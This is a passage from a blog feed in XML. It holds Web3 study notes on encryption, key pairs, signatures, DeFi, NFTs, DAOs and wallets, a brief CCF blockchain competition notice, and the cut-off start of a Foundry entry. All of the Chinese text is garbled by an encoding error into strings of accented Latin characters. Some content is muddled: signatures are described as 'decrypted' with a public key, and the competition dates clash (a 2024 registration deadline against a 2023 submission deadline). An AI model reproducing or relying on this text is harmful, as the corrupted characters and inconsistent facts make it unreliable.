        <content type="html"><![CDATA[<p>æœ€è¿‘åˆå‘ç°ä¸€ä¸ªå­¦ä¹ ç½‘ç«™ï¼Œæ­£å¥½è¶ç€å›½åº†å‡æœŸï¼Œå†æŠŠçŸ¥è¯†åˆå·©å›ºä¸€éï¼Œå°±å†™äº†è¿™ç¯‡å­¦ä¹ å­¦ä¹ ç¬”è®°è®°å½•ä¸€ä¸‹</p><h2 id="å«ä¹‰"><a href="#å«ä¹‰" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h2><p>ä»¥å‰æˆ‘ä»¬çš„ä¿¡æ¯éƒ½é›†ä¸­åœ¨ä¸€ä¸ªè½¯ä»¶ä¸Šï¼Œè¿™é€ æˆäº†ï¼Œæˆ‘ä»¬çš„ä¿¡æ¯å°±ä¼šè¢«æ³„éœ²ï¼Œå°±æ¯”å¦‚2018å¹´Facebook-å‰‘æ¡¥åˆ†æå…¬å¸æ•°æ®æ³„éœ²ä¸‘é—»ï¼Œæ•°ç™¾ä¸‡Facebookç”¨æˆ·çš„ä¸ªäººä¿¡æ¯è¢«ä¸å½“æ”¶é›†å¹¶ç”¨äºå½±å“æ”¿æ²»é€‰ä¸¾ï¼Œè¿™å°±æ˜¯æ•°æ®é›†ä¸­æ§åˆ¶çš„é£é™©å’Œåæœ</p><p>é‚£ä¹ˆweb3å°±å‡ºç°äº†ï¼Œå®ƒæ˜¯å»ºç«‹åœ¨åŒºå—é“¾æŠ€æœ¯ä¸Šçš„ä¸‹ä¸€ä»£äº’è”ç½‘ï¼Œå®ƒå¼ºè°ƒ<strong>æƒåŠ›ä¸‹æ”¾</strong>ï¼Œè¿™å°±æ„å‘³ç€æ²¡æœ‰é›†ä¸­çš„æƒå¨æœºæ„æ¥ç®¡ç†æ•°æ®å’Œèµ„æº</p><p>åœ¨web3çš„ä¸–ç•Œé‡Œï¼Œç”¨æˆ·æ‹¥æœ‰è‡ªå·±åˆ›ç«‹çš„å†…å®¹å’Œæ•°æ®ï¼Œæ‘†è„±äº†å¯¹ä¼ ç»Ÿä¸­å¿ƒåŒ–å¹³å°çš„ä¾èµ–ï¼Œç”±æ­¤web3ä¹Ÿä¿ƒè¿›äº†æ–°çš„å•†ä¸šæ¨¡å¼ï¼Œä¾‹å¦‚ï¼š<strong>å»ä¸­æ€§åŒ–é‡‘èï¼ˆDeFiï¼‰</strong>   <strong>éåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰</strong>  <strong>å»ä¸­æ€§åŒ–è‡ªæ²»ç»„ç»‡ï¼ˆDAOï¼‰</strong></p><p>å®ƒçš„å‘å±•æ¥çœ‹ï¼šä»Web1.0æ—¶ä»£çš„é™æ€ç½‘é¡µï¼Œåˆ°Web2.0çš„ç¤¾äº¤äº’åŠ¨ï¼Œå†åˆ°Web3.0çš„å»ä¸­å¿ƒåŒ–æ™ºèƒ½ç½‘ç»œ</p><p>Web3 å„èµ›é“ç™¾èŠ±é½æ”¾ï¼Œå…±åŒæ„å»ºä¸€ä¸ªå»ä¸­å¿ƒåŒ–ã€é€æ˜åŒ–ã€åˆ›æ–°åŒ–çš„æ•°å­—ç”Ÿæ€ã€‚å»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDeFiï¼‰æ¶ˆé™¤äº†ä¸­ä»‹æœºæ„ï¼Œå®ç°äº†å¼€æ”¾å¼çš„é‡‘èäº¤æ˜“å’ŒæœåŠ¡ï¼›éåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰èµ‹äºˆäº†æ•°å­—èµ„äº§å”¯ä¸€æ€§å’Œä»·å€¼ï¼›å»ä¸­å¿ƒåŒ–è‡ªæ²»ç»„ç»‡ï¼ˆDAOï¼‰ä¿ƒè¿›äº†é›†ä½“å†³ç­–å’Œå…¬å¹³ç®¡ç†ï¼›å»ä¸­å¿ƒåŒ–èº«ä»½ï¼ˆDIDï¼‰ä¿éšœäº†ä¸ªäººèº«ä»½æ•°æ®çš„å®‰å…¨å’Œéšç§ï¼›ç¤¾äº¤é‡‘èï¼ˆSocialFiï¼‰å’Œæ¸¸æˆé‡‘èï¼ˆGameFiï¼‰å°†ä¼ ç»Ÿçš„ç¤¾äº¤ã€æ¸¸æˆæ´»åŠ¨ä¸ç»æµæ¿€åŠ±ç›¸ç»“åˆï¼Œé‡æ–°å®šä¹‰äº†ç”¨æˆ·å‚ä¸çš„ä»·å€¼ï¼›åŸºç¡€è®¾æ–½èµ›é“ä¸ºæ‰€æœ‰è¿™äº›åˆ›æ–°æä¾›äº†ç¨³å®šçš„æŠ€æœ¯æ”¯æŒå’Œå‘å±•å¹³å°ã€‚</p><h2 id="web3é¢†åŸŸçš„çŸ¥è¯†"><a href="#web3é¢†åŸŸçš„çŸ¥è¯†" class="headerlink" title="web3é¢†åŸŸçš„çŸ¥è¯†"></a>web3é¢†åŸŸçš„çŸ¥è¯†</h2><h3 id="å¯¹ç§°åŠ å¯†"><a href="#å¯¹ç§°åŠ å¯†" class="headerlink" title="å¯¹ç§°åŠ å¯†"></a>å¯¹ç§°åŠ å¯†</h3><p>åŠ å¯†å’Œè§£å¯†ä½¿ç”¨åŒæ ·çš„å¯†é’¥ï¼Œè¿™æ ·å°±å¿…é¡»åŒæ–¹çŸ¥é“å¯†é’¥ï¼Œå¹¶ä¸”éƒ½ä¿è¯ä¸å‘å¤–ä¼ ï¼Œä½†æ˜¯è¿™æ ·çš„ä¿å¯†æ€§ä¸é«˜ï¼Œåªè¦æœ‰äººå¾—åˆ°äº†å¯†é’¥ï¼Œå°±èƒ½è§£å¯†</p><h3 id="éå¯¹ç§°åŠ å¯†"><a href="#éå¯¹ç§°åŠ å¯†" class="headerlink" title="éå¯¹ç§°åŠ å¯†"></a>éå¯¹ç§°åŠ å¯†</h3><p>å°±æ˜¯ä¸€ä¸ªäººï¼Œæœ‰ä¿©ä¸ªå¯†é’¥ï¼Œä¸€ä¸ªå…¬é’¥ï¼Œä¸€ä¸ªç§é’¥ï¼Œä¸‹é¢å°†è¯¦ç»†è§£é‡Š</p><h3 id="å…¬é’¥å’Œç§é’¥"><a href="#å…¬é’¥å’Œç§é’¥" class="headerlink" title="å…¬é’¥å’Œç§é’¥"></a>å…¬é’¥å’Œç§é’¥</h3><p>ç§é’¥ï¼šç§é’¥æ˜¯éšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œé€šå¸¸ç”±ä¸€ç³»åˆ—å­—æ¯å’Œæ•°å­—ç»„æˆï¼Œæ˜¯ç”¨æˆ·èº«ä»½å’Œèµ„äº§ç®¡ç†çš„æ ¸å¿ƒï¼Œå¿…é¡»ä¸¥æ ¼ä¿å¯†ã€‚<br>å…¬é’¥:å…¬é’¥ç”±ç§é’¥ç”Ÿæˆï¼Œæ˜¯ç§é’¥çš„é…å¯¹å¯†é’¥ï¼Œå¯ä»¥å…¬å¼€å…±äº«ï¼Œç”¨äºéªŒè¯ä¿¡æ¯å’ŒåŠ å¯†ç§é’¥ç­¾åçš„æ•°æ®ã€‚<br>ä»¥å‰æ²¡æœ‰åˆ†æ¸…æ¥šå…¬é’¥å’Œç§é’¥çš„ä½œç”¨ï¼Œç°åœ¨æˆ‘æ˜ç™½äº†ï¼Œå°±ä¸¾ä¸ªä¾‹å­å§<br>Aå‘Bå‘é€ä¸€ä¸ªäº¤æ˜“ï¼Œé¦–å…ˆAè·å¾—Bçš„å…¬é’¥ï¼Œç”¨æ¥å¯¹äº¤æ˜“åŠ å¯†ï¼ŒBæ”¶åˆ°äº¤æ˜“åç”¨ä»–è‡ªå·±çš„ç§é’¥è¿›è¡Œè§£å¯†ï¼Œä½†æ˜¯å…¬é’¥æ˜¯å…¬å¼€çš„ï¼Œè°éƒ½å¯ä»¥ç”¨Bçš„å…¬é’¥åŠ å¯†äº¤æ˜“ï¼Œå†’å……Aç»™Bå‘ï¼Œæ‰€ä»¥å°±æœ‰æ•°å­—ç­¾åå‡ºç°äº†ï¼ŒAåœ¨å‘é€æ¶ˆæ¯å‰ç”¨è‡ªå·±çš„ç§é’¥å…ˆå¯¹äº¤æ˜“ç­¾åï¼Œç”Ÿæˆv,r,s,Bæ¥å—åˆ°æ¶ˆæ¯åå°±å¯ä»¥ä½¿ç”¨Açš„å…¬é’¥è¿›è¡Œè§£å¯†ï¼Œè¿™ä½¿ç”¨äº†éå¯¹ç§°åŠ å¯†å’Œæ•°å­—ç­¾åçš„æŠ€æœ¯</p><h3 id="defi"><a href="#defi" class="headerlink" title="defi"></a>defi</h3><p>å»ä¸­å¿ƒåŒ–é‡‘èï¼ˆç®€ç§° DeFiï¼‰æ˜¯ä¸€ç§åŸºäºåŒºå—é“¾æŠ€æœ¯çš„é‡‘èç”Ÿæ€ç³»ç»Ÿã€‚å®ƒåˆ©ç”¨æ™ºèƒ½åˆçº¦ï¼ˆå¯è‡ªåŠ¨æ‰§è¡Œçš„ç¨‹åºä»£ç ï¼‰å®ç°é‡‘èæœåŠ¡è‡ªåŠ¨åŒ–ï¼ŒåŒæ—¶æ¶ˆé™¤ä¼ ç»Ÿé‡‘èç³»ç»Ÿä¸­çš„é“¶è¡Œå’Œç»çºªäººç­‰ä¸­ä»‹æœºæ„ã€‚åœ¨ DeFi çš„ä¸–ç•Œé‡Œï¼Œæ‰€æœ‰äº¤æ˜“å’ŒæœåŠ¡éƒ½æ˜¯é€æ˜çš„ã€æ— éœ€è®¸å¯çš„ï¼Œå¹¶ä¸”å¯¹ä»»ä½•æœ‰äº’è”ç½‘è®¿é—®æƒé™çš„äººå¼€æ”¾</p><p>ä¸ä¼ ç»Ÿçš„ä¸­å¿ƒåŒ–é‡‘èï¼ˆCeFiï¼‰ç›¸æ¯”ï¼Œå»ä¸­å¿ƒåŒ–é‡‘èåœ¨å¯åŠæ€§ã€é€æ˜åº¦ã€å®‰å…¨æ€§ã€æ•ˆç‡ã€åˆ›æ–°æ€§å’Œå»ä¸­å¿ƒåŒ–æ–¹é¢å…·æœ‰æ˜¾è‘—ä¼˜åŠ¿ã€‚</p><ul><li>é¦–å…ˆï¼ŒDeFi æä¾›æ— è¾¹ç•Œé‡‘èæœåŠ¡ï¼Œç¡®ä¿å…¨çƒç”¨æˆ·åªè¦æœ‰äº’è”ç½‘è¿æ¥å°±å¯ä»¥ä¸å—åœ°åŸŸé™åˆ¶åœ°è¿›è¡Œäº¤æ˜“ã€‚è¿™å¯¹äºä¼ ç»Ÿé“¶è¡ŒæœåŠ¡ä¸è¶³æˆ–æ— æ³•ä½¿ç”¨çš„åœ°åŒºå°¤ä¸ºé‡è¦ã€‚</li><li>å…¶æ¬¡ï¼ŒDeFi åˆ©ç”¨åŒºå—é“¾æŠ€æœ¯å…¬å¼€è®°å½•æ‰€æœ‰äº¤æ˜“ï¼Œä»»ä½•äººéƒ½å¯ä»¥éªŒè¯å’Œå®¡è®¡è¿™äº›è®°å½•ã€‚è¿™ç§å¼€æ”¾æ€§å¤§å¤§æé«˜äº†ç³»ç»Ÿçš„é€æ˜åº¦å’Œå¯ä¿¡åº¦ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿæ¸…æ¥šåœ°çœ‹åˆ°èµ„é‡‘çš„æµå‘ï¼Œä»è€Œå‡å°‘äº†éšè—çš„è´¹ç”¨å’Œæ½œåœ¨çš„ä¸å½“è¡Œä¸ºã€‚</li><li>åœ¨å®‰å…¨æ€§æ–¹é¢ï¼ŒDeFi é€šè¿‡å…ˆè¿›çš„åŠ å¯†æŠ€æœ¯ä¿æŠ¤ç”¨æˆ·çš„èµ„é‡‘å’Œäº¤æ˜“ï¼Œå¤§å¤§é™ä½äº†æ¬ºè¯ˆå’Œé»‘å®¢æ”»å‡»çš„é£é™©ã€‚è‡ªåŠ¨åŒ–æ™ºèƒ½åˆçº¦è¿˜å¯ä»¥ç¡®ä¿æ— ç¼æ‰§è¡Œäº¤æ˜“ï¼Œè€Œæ— éœ€ä¼ ç»Ÿé‡‘èæœºæ„å…¸å‹çš„å¤æ‚ç¨‹åºå’Œäººå·¥å®¡æ ¸ï¼Œä»è€Œæé«˜è¿è¥æ•ˆç‡ã€‚</li><li>åœ¨åˆ›æ–°æ–¹é¢ï¼ŒDeFi çš„å¼€æ”¾å¼€å‘å¹³å°å¸å¼•äº†æ¥è‡ªä¸–ç•Œå„åœ°çš„å¼€å‘è€…ï¼Œæ¨åŠ¨äº†æ–°çš„é‡‘èäº§å“å’ŒæœåŠ¡ä¸æ–­æ¶Œç°ã€‚è¿™ç§ä»¥ç¤¾åŒºä¸ºä¸»å¯¼çš„å¼€å‘æ¨¡å¼é¼“åŠ±æ€æƒ³äº¤æµå’Œå¿«é€Ÿè¿­ä»£ï¼ŒåŠ é€Ÿäº†é‡‘èé¢†åŸŸçš„æŠ€æœ¯è¿›æ­¥ã€‚</li><li>æœ€åï¼Œä¸å¯èƒ½é¢ä¸´å®•æœºé£é™©çš„ä¼ ç»Ÿé‡‘èæœºæ„ä¸åŒï¼ŒDeFi çš„åˆ†å¸ƒå¼ç»“æ„æœ¬è´¨ä¸Šæ¶ˆé™¤äº†å•ç‚¹æ§åˆ¶ï¼Œå¢å¼ºäº†ç³»ç»Ÿå¯¹æ•…éšœå’Œæ”»å‡»çš„æŠµå¾¡èƒ½åŠ›ã€‚å³ä½¿æŸäº›èŠ‚ç‚¹å—åˆ°æ”»å‡»ï¼Œç½‘ç»œä»å¯æŒç»­è¿è¡Œï¼Œç¡®ä¿é‡‘èæœåŠ¡çš„è¿ç»­æ€§å’Œç¨³å®šæ€§ã€‚<br>ä¸€äº›ç»å…¸çš„defié¡¹ç›®ï¼Œæˆ‘ä¹‹å‰æœ‰å†™è¿‡ç¬”è®°ï¼Œå¯ä»¥å»äº†è§£ä¸€ä¸‹</li></ul><h3 id="NFT"><a href="#NFT" class="headerlink" title="NFT"></a>NFT</h3><p>åœ¨æ·±å…¥ç ”ç©¶éåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£â€œå¯åŒè´¨åŒ–â€å’Œâ€œä¸å¯åŒè´¨åŒ–â€çš„æ¦‚å¿µã€‚åœ¨åŠ å¯†è´§å¸çš„ä¸–ç•Œé‡Œï¼Œå¯äº’æ¢æ€§æ„å‘³ç€å¯äº’æ¢æ€§ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æœ‰ 1 ä¸ª BTCï¼Œæˆ‘ä¹Ÿæœ‰ 1 ä¸ª BTCï¼Œå³ä½¿è¿™ä¸¤ä¸ª BTC å¯èƒ½ä½äºä¸åŒçš„é’±åŒ…åœ°å€ï¼Œä½†å®ƒä»¬å…·æœ‰ç›¸åŒçš„ä»·å€¼ï¼Œå¯ä»¥ç›´æ¥äº¤æ¢ã€‚è¿™å°±åƒç”¨ä¸€å¼  100 ç¾å…ƒçš„é’ç¥¨æ¢å¦ä¸€å¼ ç›¸åŒé¢å€¼çš„é’ç¥¨ä¸€æ ·ã€‚å¦ä¸€æ–¹é¢ï¼ŒéåŒè´¨åŒ–æ„å‘³ç€ç‹¬ç‰¹æ€§å’Œä¸å¯æ›¿ä»£æ€§ã€‚éåŒè´¨åŒ–ä»£å¸ (NFT) å°±æ˜¯è¿™æ ·ç‹¬ç‰¹ä¸”ä¸å¯äº’æ¢çš„æ•°å­—èµ„äº§ã€‚NFT é€šå¸¸ç”¨äºè¯æ˜æ•°å­—è‰ºæœ¯å“ã€æ”¶è—å“ç­‰èµ„äº§çš„æ‰€æœ‰æƒã€‚</p><p>ä¸åŒè´¨åŒ–ä»£å¸ç›¸æ¯”ï¼ŒéåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰åœ¨æ‰€æœ‰æƒéªŒè¯ã€å”¯ä¸€æ€§ã€æ”¶è—ä»·å€¼ã€å¸‚åœºæµåŠ¨æ€§å’Œå‚ä¸åº¦ç­‰æ–¹é¢å…·æœ‰ç‹¬ç‰¹çš„ä»·å€¼ï¼š</p><ul><li>é¦–å…ˆï¼Œä½œä¸ºåŒºå—é“¾æŠ€æœ¯çš„äº§ç‰©ï¼ŒNFT ä¸ºæ•°å­—èµ„äº§æä¾›äº†ä¸å¯ç¯¡æ”¹çš„æ‰€æœ‰æƒè¯æ˜ã€‚è¿™æ„å‘³ç€è‰ºæœ¯å®¶å’Œå†…å®¹åˆ›ä½œè€…å¯ä»¥ç¡®ä¿ä»–ä»¬çš„åŸåˆ›ä½œå“å¾—åˆ°åˆæ³•è®¤è¯å’Œè¿½è¸ªï¼Œä»è€Œä¿æŠ¤ä»–ä»¬çš„çŸ¥è¯†äº§æƒã€‚</li><li>å…¶æ¬¡ï¼Œç”±äºæ¯ä¸ª NFT éƒ½æ˜¯ä¸å¯æ›¿ä»£çš„ï¼Œå…¶å›ºæœ‰çš„ç¨€ç¼ºæ€§æˆä¸ºå…¶é‡è¦çš„ä»·å€¼æ¥æºã€‚è¿™ç§ç¨€ç¼ºæ€§ï¼Œå°¤å…¶æ˜¯å¯¹äºç‹¬ç‰¹çš„è‰ºæœ¯å“è€Œè¨€ï¼Œèµ‹äºˆäº† NFT æé«˜çš„æ”¶è—ä»·å€¼ã€‚</li><li>æ­¤å¤–ï¼Œå°½ç®¡ NFT ä¸å¯æ›¿ä»£ï¼Œä½†å®ƒä»¬ä»å¯ä»¥åœ¨å…¨çƒå¤šä¸ªå¹³å°ä¸Šä¹°å–å’Œäº¤æ˜“ï¼Œä»è€Œä¸ºå…¶æä¾›æµåŠ¨æ€§ã€‚éšç€å¸‚åœºçš„ä¸æ–­å¢é•¿ï¼Œè¿™ç§æµåŠ¨æ€§æ­£åœ¨ç¨³æ­¥å¢åŠ ã€‚</li><li>æœ€åï¼Œä¸€äº› NFT é¡¹ç›®å…è®¸æŒæœ‰è€…å¯¹é¡¹ç›®çš„å‘å±•è¿›è¡ŒæŠ•ç¥¨æˆ–æä¾›ç¤¾åŒºç‰¹å®šçš„ç¦åˆ©ã€‚è¿™å¢å¼ºäº†ç”¨æˆ·ä½“éªŒï¼Œä½¿ NFT ä¸ä»…ä»…æ˜¯ä¸€ç§æ”¶è—å“ï¼Œè€Œæ˜¯ä¸€ä¸ªæ‹¥æœ‰ç¤¾åŒºå’Œç”Ÿæ€ç³»ç»Ÿçš„æ´»è·ƒé¡¹ç›®ã€‚</li></ul><h3 id="DAO"><a href="#DAO" class="headerlink" title="DAO"></a>DAO</h3><p>ä¸€ä¸ªå»ä¸­å¿ƒåŒ–è‡ªæ²»ç»„ç»‡ï¼ˆDAOï¼‰æ˜¯åŸºäºåŒºå—é“¾æŠ€æœ¯çš„ç»„ç»‡å½¢å¼ï¼Œé€šè¿‡æ™ºèƒ½åˆçº¦è‡ªåŠ¨æ‰§è¡Œç»„ç»‡çš„è§„åˆ™å’Œå†³ç­–ã€‚ä¸ä¼ ç»Ÿå…¬å¸ä¸åŒï¼ŒDAO ç¼ºä¹ç®¡ç†å±‚å’Œä¸­å¤®æƒå¨ï¼›æ‰€æœ‰å†³ç­–éƒ½é€šè¿‡æˆå‘˜æŠ•ç¥¨æˆ–é¢„å®šç®—æ³•åšå‡ºã€‚æˆå‘˜é€šå¸¸æŒæœ‰èµ‹äºˆä»–ä»¬æŠ•ç¥¨æƒçš„ä»£å¸ï¼Œä½¿ä»–ä»¬èƒ½å¤Ÿç›´æ¥å‚ä¸ç»„ç»‡çš„æ²»ç†ï¼Œä¾‹å¦‚æå‡ºææ¡ˆã€å†³å®šé¡¹ç›®æ–¹å‘å’Œåˆ†é…èµ„é‡‘ã€‚</p><p>ä¸ä¼ ç»Ÿå…¬å¸ç›¸æ¯”ï¼ŒDAO åœ¨é€æ˜åº¦ã€ä¿¡ä»»è¦æ±‚ã€è¿è¥æ•ˆç‡ã€å‚ä¸å¼æ°‘ä¸»å’Œå®‰å…¨æ€§æ–¹é¢å…·æœ‰æ˜¾è‘—ä¼˜åŠ¿ã€‚</p><ul><li>é¦–å…ˆï¼ŒDAO å†…çš„æ‰€æœ‰å†³ç­–è¿‡ç¨‹å’Œé‡‘èäº¤æ˜“éƒ½å…¬å¼€è®°å½•åœ¨åŒºå—é“¾ä¸Šï¼Œä»»ä½•å¤–éƒ¨å®¡è®¡å¸ˆéƒ½å¯ä»¥è½»æ¾éªŒè¯ï¼Œä»è€Œæé«˜äº†ç»„ç»‡çš„é€æ˜åº¦ã€‚</li><li>å…¶æ¬¡ï¼ŒDAO å†…éƒ¨æˆå‘˜ä¹‹é—´çš„äº¤äº’æ˜¯é€šè¿‡ä»£ç æ¥å®ç°çš„ï¼Œæˆå‘˜â€‹â€‹åªéœ€è¦ä¿¡ä»»æ™ºèƒ½åˆçº¦ä»£ç æœ¬èº«ï¼Œè€Œä¸éœ€è¦åƒä¼ ç»Ÿå…¬å¸é‚£æ ·ä¿¡ä»»ä¸ªåˆ«é¢†å¯¼æˆ–è€…ä¸€ä¸ªä¸­å¿ƒåŒ–çš„å›¢é˜Ÿã€‚</li><li>æ­¤å¤–ï¼Œç”±äºæ™ºèƒ½åˆçº¦å¯ä»¥è‡ªåŠ¨æ‰§è¡Œä»»åŠ¡ï¼Œè¿™å‡å°‘äº†æ‰‹åŠ¨å¤„ç†çš„éœ€è¦ï¼Œæ¶ˆé™¤äº†è®¸å¤šä¸å¿…è¦çš„ä¸­ä»‹ï¼Œå¹¶æé«˜äº†ç»„ç»‡è¿è¥çš„æ•ˆç‡ã€‚</li><li>æ­¤å¤–ï¼ŒDAO å…è®¸æ¯ä¸ªæŒæœ‰ä»£å¸çš„æˆå‘˜å‚ä¸å†³ç­–ï¼Œä¿ƒè¿›æ›´åŠ æ°‘ä¸»çš„å†³ç­–è¿‡ç¨‹ï¼Œå¹¶ç¡®ä¿ç»„ç»‡çœŸæ­£ç”±ç¤¾åŒºæˆå‘˜é©±åŠ¨ã€‚</li><li>æœ€åï¼ŒåŒºå—é“¾æŠ€æœ¯çš„ä½¿ç”¨å¢å¼ºäº† DAO çš„å®‰å…¨æ€§ï¼Œå› ä¸ºå®ƒä¾é åŠ å¯†å’Œå…±è¯†ç®—æ³•æ¥ä¿æŠ¤æ•°æ®å’Œèµ„äº§ï¼Œä»è€Œåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šé˜²æ­¢å¤–éƒ¨æ”»å‡»å’Œå†…éƒ¨æ»¥ç”¨ã€‚</li></ul><h3 id="Web3é’±åŒ…"><a href="#Web3é’±åŒ…" class="headerlink" title="Web3é’±åŒ…"></a>Web3é’±åŒ…</h3><p>Web3 é’±åŒ…æ˜¯ä¸€ç§ä¸“ä¸ºä¸ Web3 æŠ€æœ¯ï¼ˆå»ä¸­å¿ƒåŒ–ç½‘ç»œï¼‰é›†æˆè€Œè®¾è®¡çš„æ•°å­—è´§å¸é’±åŒ…ã€‚ä¸ä¼ ç»Ÿæ•°å­—è´§å¸é’±åŒ…ä¸åŒï¼ŒWeb3 é’±åŒ…å…è®¸ç”¨æˆ·ä¸å»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åº (DApp) äº¤äº’ã€ç­¾ç½²äº¤æ˜“å¹¶ç®¡ç†å…¶åŠ å¯†èµ„äº§ï¼Œè€Œæ— éœ€ä¾èµ–ä¸­å¿ƒåŒ–ç¬¬ä¸‰æ–¹ã€‚è¿™äº›é’±åŒ…é€šå¸¸æ”¯æŒå¤šç§åŠ å¯†è´§å¸ï¼Œå¹¶æä¾›å®‰å…¨çš„ç§é’¥ç®¡ç†åŠŸèƒ½ï¼Œä»¥ç¡®ä¿ç”¨æˆ·èµ„é‡‘çš„å®‰å…¨ã€‚</p><p>åœ¨ Web3 ä¸–ç•Œä¸­ï¼Œä¸€äº›æµè¡Œçš„é’±åŒ…åº”ç”¨ç¨‹åºå› å…¶å®‰å…¨æ€§ã€æ˜“ç”¨æ€§å’ŒåŠŸèƒ½æ€§è€Œè„±é¢–è€Œå‡ºï¼Œæˆä¸ºç”¨æˆ·çš„é¦–é€‰ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›æµè¡Œçš„ Web3 é’±åŒ…ï¼š</p><ul><li>MetaMaskï¼šMetaMask æ˜¯æœ€è‘—åçš„ä»¥å¤ªåŠé’±åŒ…ä¹‹ä¸€ã€‚å®ƒæ˜¯ä¸€ä¸ªæµè§ˆå™¨æ‰©å±•å’Œç§»åŠ¨åº”ç”¨ç¨‹åºï¼Œå…è®¸ç”¨æˆ·åœ¨ç½‘ç»œæµè§ˆå™¨ä¸­è½»æ¾è®¿é—®ä»¥å¤ªåŠ DApp å¹¶ç®¡ç†å…¶åŠ å¯†èµ„äº§ã€‚</li><li>Trust Walletï¼šTrust Wallet æ˜¯ä¸€æ¬¾å®‰å…¨çš„ç§»åŠ¨é’±åŒ…åº”ç”¨ç¨‹åºï¼Œæ”¯æŒå¤šç§åŠ å¯†è´§å¸ï¼ŒåŒ…æ‹¬ä»¥å¤ªåŠå’Œæ¯”ç‰¹å¸ã€‚å®ƒæä¾›äº†ç”¨æˆ·å‹å¥½çš„ç•Œé¢ï¼Œå¹¶æ”¯æŒä¸ DeFi åº”ç”¨ç¨‹åºé›†æˆã€‚</li><li>Coinbase é’±åŒ…ï¼šCoinbase é’±åŒ…æ˜¯åŠ å¯†è´§å¸äº¤æ˜“å¹³å° Coinbase æ¨å‡ºçš„ä¸€æ¬¾é’±åŒ…åº”ç”¨ï¼Œæ”¯æŒä»¥å¤ªåŠå’Œ ERC-20 ä»£å¸ï¼Œå†…ç½® DApp æµè§ˆå™¨ã€‚</li><li>å¸å®‰é“¾é’±åŒ…ï¼šå¸å®‰é“¾é’±åŒ…æ˜¯åŠ å¯†è´§å¸äº¤æ˜“å¹³å°å¸å®‰æ¨å‡ºçš„é’±åŒ…åº”ç”¨ï¼Œæ—¨åœ¨å…¼å®¹å¸å®‰æ™ºèƒ½é“¾ï¼ˆBSCï¼‰å¹¶æ”¯æŒå¤šç§åŠ å¯†è´§å¸å’ŒDAppã€‚</li><li>Trezorï¼šTrezor æ˜¯ä¸€æ¬¾ä»¥é«˜å®‰å…¨æ€§å’Œä¾¿æºæ€§è‘—ç§°çš„ç¡¬ä»¶é’±åŒ…ã€‚å®ƒæ”¯æŒå¤šç§åŠ å¯†è´§å¸ï¼ŒåŒ…æ‹¬æ¯”ç‰¹å¸å’Œä»¥å¤ªåŠï¼Œæ˜¯å®‰å…¨å­˜å‚¨åŠ å¯†èµ„äº§çš„ç†æƒ³é€‰æ‹©ã€‚</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CCFåŒºå—é“¾æŠ€æœ¯ä¸åº”ç”¨åˆ›æ–°ç«èµ›</title>
      <link href="/2024/09/25/CCF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E5%88%9B%E6%96%B0%E7%AB%9E%E8%B5%9B/"/>
      <url>/2024/09/25/CCF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E5%88%9B%E6%96%B0%E7%AB%9E%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="å‚èµ›é˜Ÿä¼æœ€å¤š4äººï¼Œéœ€è¦ä¸€åæŒ‡å¯¼è€å¸ˆ"><a href="#å‚èµ›é˜Ÿä¼æœ€å¤š4äººï¼Œéœ€è¦ä¸€åæŒ‡å¯¼è€å¸ˆ" class="headerlink" title="å‚èµ›é˜Ÿä¼æœ€å¤š4äººï¼Œéœ€è¦ä¸€åæŒ‡å¯¼è€å¸ˆ"></a>å‚èµ›é˜Ÿä¼æœ€å¤š4äººï¼Œéœ€è¦ä¸€åæŒ‡å¯¼è€å¸ˆ</h3><h3 id="æŠ¥åæ—¶é—´ï¼šæˆªæ­¢åˆ°2024å¹´9æœˆ30å·"><a href="#æŠ¥åæ—¶é—´ï¼šæˆªæ­¢åˆ°2024å¹´9æœˆ30å·" class="headerlink" title="æŠ¥åæ—¶é—´ï¼šæˆªæ­¢åˆ°2024å¹´9æœˆ30å·"></a>æŠ¥åæ—¶é—´ï¼šæˆªæ­¢åˆ°2024å¹´9æœˆ30å·</h3><h3 id="æäº¤ä½œå“ï¼šæˆªæ­¢åˆ°2023å¹´10æœˆ31å·-ç½‘å€https-btc-ccf-org-cn"><a href="#æäº¤ä½œå“ï¼šæˆªæ­¢åˆ°2023å¹´10æœˆ31å·-ç½‘å€https-btc-ccf-org-cn" class="headerlink" title="æäº¤ä½œå“ï¼šæˆªæ­¢åˆ°2023å¹´10æœˆ31å· ç½‘å€https://btc.ccf.org.cn"></a>æäº¤ä½œå“ï¼šæˆªæ­¢åˆ°2023å¹´10æœˆ31å· ç½‘å€<a href="https://btc.ccf.org.cn/">https://btc.ccf.org.cn</a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>foundryçš„ä½¿ç”¨å’Œå®‰è£…</title>
      <link href="/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/"/>
      <url>/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/</url>
      
